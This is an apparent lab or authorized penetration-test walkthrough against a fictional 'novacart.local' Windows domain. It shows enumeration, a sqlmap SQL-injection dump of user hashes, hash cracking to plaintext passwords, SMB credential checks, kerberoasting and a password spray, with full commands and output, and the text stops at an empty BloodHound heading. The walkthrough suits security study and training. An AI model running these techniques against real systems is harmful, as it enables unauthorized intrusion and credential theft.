
# Objective and scope
NovaCart is an e-commerce company that operates a webshop for PC accessories. However, the entire platform is still under active development and expansion.

The IT team is currently working on a Linux-based version of the webshop as well as the development of a mobile app for NovaCart. The team is focused on adding features quickly, and has not prioritized security.

We have been tasked with conducting a penetration test to thoroughly assess the environment, identify vulnerabilities, and evaluate the overall security of the system.

The client has provided you with VPN access to their internal network, but no credentials.

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.0.18.23   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-01 17:12 +0100
Nmap scan report for 10.0.18.23
Host is up (0.096s latency).
Not shown: 65506 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5000/tcp  open  upnp
5985/tcp  open  wsman
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49704/tcp open  unknown
49711/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 34.83 seconds
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5000,5985,8080,9389 -A --min-rate=2000 -sT 10.0.18.23
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-01 17:16 +0100
Nmap scan report for 10.0.18.23
Host is up (0.096s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: NovaCart | Premium PC Components & Gaming Systems
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-01 16:16:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: novacart.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: novacart.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.novacart.local
| Not valid before: 2025-12-24T22:48:49
|_Not valid after:  2026-06-25T22:48:49
| rdp-ntlm-info: 
|   Target_Name: NOVACART
|   NetBIOS_Domain_Name: NOVACART
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: novacart.local
|   DNS_Computer_Name: DC.novacart.local
|   DNS_Tree_Name: novacart.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-01T16:16:36+00:00
|_ssl-date: 2026-05-01T16:16:45+00:00; 0s from scanner time.
5000/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  NTLM
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
| http-ntlm-info: 
|   Target_Name: NOVACART
|   NetBIOS_Domain_Name: NOVACART
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: novacart.local
|   DNS_Computer_Name: DC.novacart.local
|   DNS_Tree_Name: novacart.local
|_  Product_Version: 10.0.17763
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http          Jetty 12.0.25
|_http-server-header: Jetty(12.0.25)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (93%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (93%), Microsoft Windows 10 1709 - 22H2 (92%), Microsoft Windows 10 1909 (90%), Microsoft Windows 10 1909 - 2004 (90%), Microsoft Windows 11 24H2 - 25H2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2016 (88%), Microsoft Windows 10 21H2 (87%), Microsoft Windows Server 2012 Data Center (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Three webservers running
- port 80
- port 5000
- port 8080

Winrm and RDP are also open

Nothing interesting in DNS

# HTTP (80)
## Nuclei
```python
nuclei -u http://novacart.local/

[iis-shortname-detect] [http] [info] http://novacart.local/*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://novacart.local/tqqjrdw5*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://novacart.local/*~1*/a.aspx
[waf-detect:aspgeneric] [http] [info] http://novacart.local/
[waf-detect:modsecurity] [http] [info] http://novacart.local/
[rdp-detect] [javascript] [info] novacart.local:3389
[ldap-metadata] [javascript] [info] novacart.local:389 ["DomainFunctionality: 7","ForestFunctionality: 7","DomainControllerFunctionality: 7","BaseDN: dc=389","DnsHostName: DC.novacart.local","DefaultNamingContext: DC=novacart,DC=local"]
[mysql-info] [javascript] [info] novacart.local:3306 ["Version:","Transport: tcp"]
[smb-version-detect:smb-version] [javascript] [info] novacart.local:445 ["SMB 2.1"]
[smb2-server-time] [javascript] [info] novacart.local:445 ["SystemTime: 2026-05-01T16:25:56.000Z ServerStartTime: 2009-04-22T19:24:48.000Z"]
[smb2-capabilities] [javascript] [info] novacart.local:445 ["["DFSSupport","LargeMTU","Leasing"]"]
[ldap-anonymous-login-detect] [javascript] [medium] novacart.local:389
[smb-enum-domains] [javascript] [info] novacart.local:445 ["DomainName: novacart.local"]
[smb-enum] [javascript] [info] novacart.local:445 ["NetBIOSComputerName: DC","NetBIOSDomainName: NOVACART","DNSComputerNamen: DC.novacart.local","DNSComputerName: DC.novacart.local","ForestName: novacart.local","OSVersion: 10.0.17763"]
[smb-os-detect] [javascript] [info] novacart.local:445 ["Windows Server 2019, Version 1809"]
[mysql-detect] [tcp] [info] novacart.local:3306
[rdp-detection:win2016] [tcp] [info] novacart.local:3389
[microsoft-iis-version] [http] [info] http://novacart.local/ ["Microsoft-IIS/10.0"]
[aspnet-version-detect] [http] [info] http://novacart.local/%3f ["4.0.30319"]
[missing-sri] [http] [info] http://novacart.local/ ["https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css","https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap"]
[addeventlistener-detect] [http] [info] http://novacart.local/
[email-extractor] [http] [info] http://novacart.local/ ["support@novacart.com"]
[old-copyright] [http] [info] http://novacart.local/ ["&copy; 2023"]
[http-missing-security-headers:strict-transport-security] [http] [info] http://novacart.local/
[http-missing-security-headers:content-security-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:permissions-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:x-content-type-options] [http] [info] http://novacart.local/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://novacart.local/
[http-missing-security-headers:referrer-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:clear-site-data] [http] [info] http://novacart.local/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:x-frame-options] [http] [info] http://novacart.local/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://novacart.local/
[http-missing-security-headers:missing-content-type] [http] [info] http://novacart.local/
[options-method] [http] [info] http://novacart.local/ ["OPTIONS, TRACE, GET, HEAD, POST"]
[tech-detect:font-awesome] [http] [info] http://novacart.local/
[tech-detect:google-font-api] [http] [info] http://novacart.local/
[tech-detect:ms-iis] [http] [info] http://novacart.local/
[caa-fingerprint] [dns] [info] novacart.local
```

It looks like its identified mysql as being open!

```python
nmap -p 3306 -A dc.novacart.local                 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-01 17:28 +0100
Nmap scan report for dc.novacart.local (10.0.18.23)
Host is up (0.096s latency).
rDNS record for 10.0.18.23: DC.novacart.local

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL (unauthorized)
```
Nmap is telling me it is as well

There are no subdomains!

After running feroxbuster i did not find anything interesting

![1031](Pasted%20image%2020260501173754.png)

Whats interesting is there is a search function that is pulling from a file, could be vulnerable to some sort of local file inclusion

Doesnt appear to be vulnerable to SQLi

# SQLi leads to initial access

```python
sqlmap -u http://novacart.local/search.aspx?q=graphics --batch --flush-session --dbs --risk 3 --level 5

[17:47:27] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 2022 or 10 or 2016 or 11
web application technology: Microsoft IIS 10.0, ASP.NET, ASP.NET 4.0.30319
back-end DBMS: Microsoft SQL Server 2019

available databases [4]:
[*] model
[*] msdb
[*] NovaCart
[*] tempdb
```

Ill start by targeting the `NovaCart` DB

```python
sqlmap -u http://novacart.local/search.aspx?q=graphics --batch --flush-session --dbs --risk 3 --level 5 -D NovaCart --tables

Database: NovaCart
[3 tables]
+-----------------+
| payment_methods |
| products        |
| users           |
+-----------------+
```
Ill select the users table

```python
sqlmap -u http://novacart.local/search.aspx?q=graphics --batch --flush-session --dbs --risk 3 --level 5 -D NovaCart -T users --dump

Database: NovaCart
Table: users
[4 entries]
+----+------------+-----------------------------------------------------------------------+
| id | username   | password_hash                                                         |
+----+------------+-----------------------------------------------------------------------+
| 5  | j.paul     | 65a3657685b09db625ef25da7754d7d140e75c3640dc2482de87218ee8d85b2b:jb44 |
| 6  | m.ruehl    | 57eeb5788565564c9a3a0283eb615204534583a8fbd3ccae1637a04df12287b1:jb43 |
| 7  | d.barowski | bf9b834e082c88823b59d05446a819276a907114c928505b829ddbbad73d6d35:jb42 |
| 8  | d.winkler  | 66be630f32845c0d7b098b4d94f1ca424ae3e35266267078f7974248caf412ac:jb45 |
+----+------------+-----------------------------------------------------------------------+
```
Found some users and some password hashes

## Cracking hashes

```python
hashcat sqli-hashes.txt /usr/share/wordlists/rockyou.txt -m 1420

65a3657685b09db625ef25da7754d7d140e75c3640dc2482de87218ee8d85b2b:jb44:password123
bf9b834e082c88823b59d05446a819276a907114c928505b829ddbbad73d6d35:jb42:kubarow
```
So its cracked two hashes

```python
j.paul:password123
d.barowski:kubarow
```
I will now validate these credentials

```python
nxc smb dc.novacart.local -u 'j.paul' -p 'password123'                          
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\j.paul:password123

nxc smb dc.novacart.local -u 'd.barowski' -p 'kubarow'
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\d.barowski:kubarow
```
Both users are compromised here!

Both users have the same access on SMB 

# Access on SMB shares for `j.paul` and `d.barowski`
```python
nxc smb dc.novacart.local -u 'j.paul' -p 'password123' --shares
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\j.paul:password123 
SMB         10.0.18.23      445    DC               [*] Enumerated shares
SMB         10.0.18.23      445    DC               Share           Permissions     Remark
SMB         10.0.18.23      445    DC               -----           -----------     ------
SMB         10.0.18.23      445    DC               ADMIN$                          Remote Admin
SMB         10.0.18.23      445    DC               C$                              Default share
SMB         10.0.18.23      445    DC               IPC$            READ            Remote IPC
SMB         10.0.18.23      445    DC               NETLOGON        READ            Logon server share 
SMB         10.0.18.23      445    DC               Shares          READ            
SMB         10.0.18.23      445    DC               SYSVOL          READ            Logon server share
```

So i have read access on `Shares`

```python
nxc smb dc.novacart.local -u 'd.barowski' -p 'kubarow' --users-export users.txt
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\d.barowski:kubarow 
SMB         10.0.18.23      445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.0.18.23      445    DC               Administrator                 2026-02-28 11:04:32 0       Built-in account for administering the computer/domain 
SMB         10.0.18.23      445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.0.18.23      445    DC               krbtgt                        2025-12-22 18:11:25 0       Key Distribution Center Service Account 
SMB         10.0.18.23      445    DC               j.bronski                     2025-12-31 20:20:59 0        
SMB         10.0.18.23      445    DC               d.barowski                    2025-12-22 19:32:21 0        
SMB         10.0.18.23      445    DC               svc_jenkins                   2025-12-23 10:19:07 0        
SMB         10.0.18.23      445    DC               j.paul                        2025-12-23 15:25:20 0        
SMB         10.0.18.23      445    DC               m.ruehl                       2025-12-23 15:25:20 0        
SMB         10.0.18.23      445    DC               d.winkler                     2025-12-23 15:25:20 0        
SMB         10.0.18.23      445    DC               j.dillon                      2026-03-02 20:29:26 0        
SMB         10.0.18.23      445    DC               t.morris                      2025-12-24 18:18:33 0        
SMB         10.0.18.23      445    DC               l.harrow                      2025-12-24 11:59:06 0        
SMB         10.0.18.23      445    DC               l.forta                       2025-12-25 00:54:36 0        
SMB         10.0.18.23      445    DC               p.bruce                       2025-12-25 00:55:06 0        
SMB         10.0.18.23      445    DC               m.mignola                     2026-03-17 21:46:43 0        
SMB         10.0.18.23      445    DC               l.thompson                    2025-12-31 20:36:45 0        
SMB         10.0.18.23      445    DC               m.brown                       2026-03-08 18:03:23 0        
SMB         10.0.18.23      445    DC               m.ibabao                      2026-03-17 19:29:32 0        
SMB         10.0.18.23      445    DC               andrew.collins                2026-03-08 18:02:28 0        
SMB         10.0.18.23      445    DC               m.turner                      2026-03-09 16:43:36 0        
SMB         10.0.18.23      445    DC               d.parker                      2026-03-09 16:43:36 0        
SMB         10.0.18.23      445    DC               j.bennett                     2026-03-09 16:43:36 0        
SMB         10.0.18.23      445    DC               l.harrison                    2026-03-09 16:43:37 0        
SMB         10.0.18.23      445    DC               o.griffin                     2026-03-09 16:43:37 0        
SMB         10.0.18.23      445    DC               j.clark                       2026-03-17 18:09:07 0        
SMB         10.0.18.23      445    DC               m.hughes                      2026-03-17 18:10:39 0        
SMB         10.0.18.23      445    DC               d.james                       2026-03-14 08:19:42 0        
SMB         10.0.18.23      445    DC               m.miller                      2026-03-14 08:19:42 0        
SMB         10.0.18.23      445    DC               s.diaz                        2026-03-14 08:19:43 0        
SMB         10.0.18.23      445    DC               cliff.b                       2026-03-17 16:32:38 0        
SMB         10.0.18.23      445    DC               [*] Enumerated 30 local users: NOVACART
SMB         10.0.18.23      445    DC               [*] Writing 30 local users to users.txt
```
Ill dump all the users here

Neither user has any access on WINRM or RDP
# Kerberoasting

Now i have valid credentials i can try kerberoasting

Also worth noting asrep roasting also failed

```python
nxc ldap dc.novacart.local -u j.paul -p 'password123' --kerberoasting kerb.hashes
LDAP        10.0.18.23      389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:novacart.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.18.23      389    DC               [+] novacart.local\j.paul:password123 
LDAP        10.0.18.23      389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.0.18.23      389    DC               [*] Total of records returned 1
LDAP        10.0.18.23      389    DC               [*] sAMAccountName: m.brown, memberOf: CN=Service Delegation Admins,CN=Users,DC=novacart,DC=local, pwdLastSet: 2026-03-08 18:03:23.807148, lastLogon: 2026-03-14 17:09:53.841255
LDAP        10.0.18.23      389    DC               $krb5tgs$23$*m.brown$NOVACART.LOCAL$novacart.local\m.brown*$b0a3c0d663e8bc139d8f2b1a6549c414$bc4e67ad85d6ef76fddf19cd55053c0d9270d568d95d84d1c72abc2486ba988c3859376f4cf41e56caf8ff29a984f85c943cf467f03194647f917b8e464a11ef2b5e2cfb9de0b30216cbc2cca7670aa561d48711ea486b0b65a27d18dd0765c9b8a43903c3afd9e75ebe3c0a09231ff616be74a57daeb08b31f2faafca653aac30b0ceb58fd26fabb27aa9a0fbabf724f27526f51e99143162061b0fa1c0f0d8b0247d2a18d27e803ce5726a76c6abe6868e46da51033e77ce4491d1e9b140618932f8db92c02f34cbd608c6d717ceb605a4543a75722eb7ed4f304fe7a58ee5e7e8e5d1faea236a73ac169f2f90efec2c280a639bbd0e58b26d3cc3eba1181680a04b5237522511c81947efb240df3dd8c147cf2cce3926988b0b51c086a989fb82f750af3a532f61029d076842e6e1ad9c9e8381204470a1e9a9d3c6e348d6e06cb41dfec91d3751d7b9e15acbe8386413ad71b743285f51d98043ee3d8cb16ee3ff840e56a0a5cf98d9299c1d856c67b89865d7f08ca2ad31bd539bf64e293d2d0ec509cefef5d0084212082c0407333f14559a183f1ad22628e51958be74617fc453516be24f3af0d061114c110b9a04c7db1fb34f983e830681a52181f449d470a2d1e52fab5579ca09418d4fef10d3234776aa7b77b390c6ee15a3901f82e8898213ec1fd714730976db187fac1fa93491d064aab91e4dbdd162d7a3b2389306b8357578b842a97a45a23acd55602239d9b56e50e06657a2b460abdff2f929b14a2b6e5a578657086b9c81eb97c7f3c409ad3c428f0f4afcc266b8f0cef4dc39134476dd796b5d215f4acd734a9c7b477b5b30477886ee1ec3c4288f5cc198a24fb0c0c4e0bc1ea69bce4fb564a0bee5154aaa768e44d067e71318ccc82e74ccf2385e3edcc6e2defc92128a2b33e45b8964891e2b049c08bfe3798e7f45615a7271ce2e6cc9b1d279067f13202c04d1d6ca435fbfb9d32e3bb5dc9625a64665c54248a465cc9d78d96055b65fbd25cd05ab8d470f5deb2676841d8e919551725d5eeb7e382ec0e24d749e34cde427660630ac67bab858584eb9939f8847d63a00cb0acaca26c330d9dde9d691411c503d8a5ae231cdcb5f75843114b60f0120fa80695541184a31047034185bbd4ea9ea359b3a41c3cd2cc448fe3cd12ffde34210c1d59c85816beae1866c0f5e7a61a1441d5fb4fc29c8bb3d8e1205c79ebffefa453ff9f428658ac985455d43225843ff4c6e9a7592831d5e786a1aab31f6ee8abafd4f36f3753ee5f60f94ecf8c42e22b074a2559cf7f217849539287ed8cd9d7f3f51b6fc815d8af23e6a86bcb43c4bdbd8f21b52efe047adc3f5defcd6192695acbef9e82da424ed650af5036f486a23a936ecc1094f003792e5e4044aa79c787e51c933522b276a2e7c07a9706eed5610a47c1ac6fb9fdee88801c0c82029
```

Looks like ive got a hash

The hash does not crack

# Password spray

```python
nxc smb dc.novacart.local -u users.txt -p password123 --continue-on-success
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [-] novacart.local\Administrator:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\Guest:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\krbtgt:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.bronski:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.barowski:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\svc_jenkins:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [+] novacart.local\j.paul:password123 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.ruehl:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.winkler:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.dillon:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\t.morris:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.harrow:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.forta:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\p.bruce:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.mignola:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.thompson:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.brown:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.ibabao:password123 STATUS_ACCOUNT_RESTRICTION 
SMB         10.0.18.23      445    DC               [-] novacart.local\andrew.collins:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.turner:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.parker:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.bennett:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.harrison:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\o.griffin:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.clark:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.hughes:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.james:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.miller:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\s.diaz:password123 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\cliff.b:password123 STATUS_LOGON_FAILURE
```
So there is one user who is giving the error `STATUS_ACCOUNT_RESTRICTION` 

This is for the user `m.ibabao`

I am thinking this user is part of the protected users group but after trying kerberos auth on that user using both passwords it still fails so my verdict is the user is in protected users i just dont have the password yet

# Bloodhound

